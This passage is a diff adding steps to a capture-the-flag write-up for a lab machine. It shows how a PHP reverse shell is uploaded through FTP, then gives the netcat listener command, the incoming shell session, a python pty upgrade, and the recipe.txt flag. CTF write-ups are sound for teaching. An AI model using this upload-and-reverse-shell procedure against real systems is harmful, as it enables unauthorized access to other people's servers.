@@ -171,8 +171,56 @@ curl http://$ip/files/ftp/
 
 It seems like we are able to upload files via ftp and read them in the browser. <br/>
 This normally indicates that a reverse shell is possible.
+```sh
+ftp> put rev_shell.php
+local: rev_shell.php remote: rev_shell.php
+229 Entering Extended Passive Mode (|||46398|)
+150 Ok to send data.
+100% |******************************************************************************************************************************************************************************************************************|  5489       84.43 MiB/s    00:00 ETA226 Transfer complete.
+5489 bytes sent in 00:00 (38.34 KiB/s)
+```
 
+After uploading this and opening a netcat listener we are able to get a reverse shell:
+```sh
+nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [10.18.20.25] from (UNKNOWN) [10.10.76.230] 33016
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 12:39:50 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ export TERM=xterm
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@startup:/$ ls
+ls
+bin   home            lib         mnt         root  srv  vagrant
+boot  incidents       lib64       opt         run   sys  var
+dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
+etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
+```
 
+Here we can read `recipe.txt`:
+```sh
+www-data@startup:/$ cat recipe.txt
+cat recipe.txt
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+```
 
+First Flag: `love`.
 
+The next Flag is supposed to be a User Flag, therefore let's try to become a user
 
+```sh
+www-data@startup:/$ ls /home/
+lennie
+www-data@startup:/$ cd /home/lennie
+bash: cd: /home/lennie: Permission denied
+```
+
+This doesn't get us far. There is also a suspicious direcotry:
+```sh
+www-data@startup:/$ ls incidents
+ls incidents
+suspicious.pcapng
+```
